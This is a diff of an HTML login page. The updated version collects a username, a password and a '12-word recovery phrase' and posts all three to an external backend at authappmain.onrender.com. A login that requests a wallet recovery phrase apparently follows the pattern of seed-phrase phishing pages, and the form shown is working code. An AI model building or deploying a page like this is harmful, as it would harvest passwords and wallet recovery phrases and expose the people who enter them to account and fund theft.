@@ -1,28 +1,38 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Login</title><link rel="stylesheet" href="css/styles.css"></head><body>
-<nav>
-  <a href="/">Home</a>
-  <a href="/signup.html">Sign Up</a>
-  <a href="/login.html">Login</a>
-  <a href="/profile.html">Profile</a>
-  <a href="/subscriptions/premium.html">Premium Area</a>
-</nav>
-<div class="container">
-  <h2>Login</h2>
-  <input type="text" id="username" placeholder="Username">
-  <input type="password" id="password" placeholder="Password">
-  <textarea id="phrase" placeholder="12-word phrase" rows="3"></textarea>
-  <button class="btn-primary" onclick="login()">Login</button>
-</div>
-<script>
-async function login() {
-  const res = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',
-    body:JSON.stringify({
-      username: document.getElementById('username').value,
-      password: document.getElementById('password').value,
-      phrase: document.getElementById('phrase').value
-    })
-  }).then(r=>r.json());
-  if(res.success) location.href='/profile.html'; else alert('Wrong credentials');
-}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+
+<body>
+  <nav><a href="/">Home</a> | <a href="/signup.html">Sign Up</a> | <a href="/login.html">Login</a></nav>
+  <div class="container">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <textarea id="phrase" placeholder="12-word recovery phrase" required></textarea>
+    <button onclick="login()">Login</button>
+  </div>
+
+
+
+  <script>
+const BACKEND_URL = 'https://authappmain.onrender.com';
+console.log('Login → Backend:', BACKEND_URL);
 </script>
-</body></html>
+  
+  <script>
+    async function login() {
+      const res = await fetch(`${BACKEND_URL}/api/login`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
+        body: JSON.stringify({ username: document.getElementById('username').value, password: document.getElementById('password').value, phrase: document.getElementById('phrase').value })
+      }).then(r => r.json());
+      if (res.success) location.href = '/profile.html'; else alert('Wrong credentials');
+    }
+  </script>
+</body>
+
+</html>
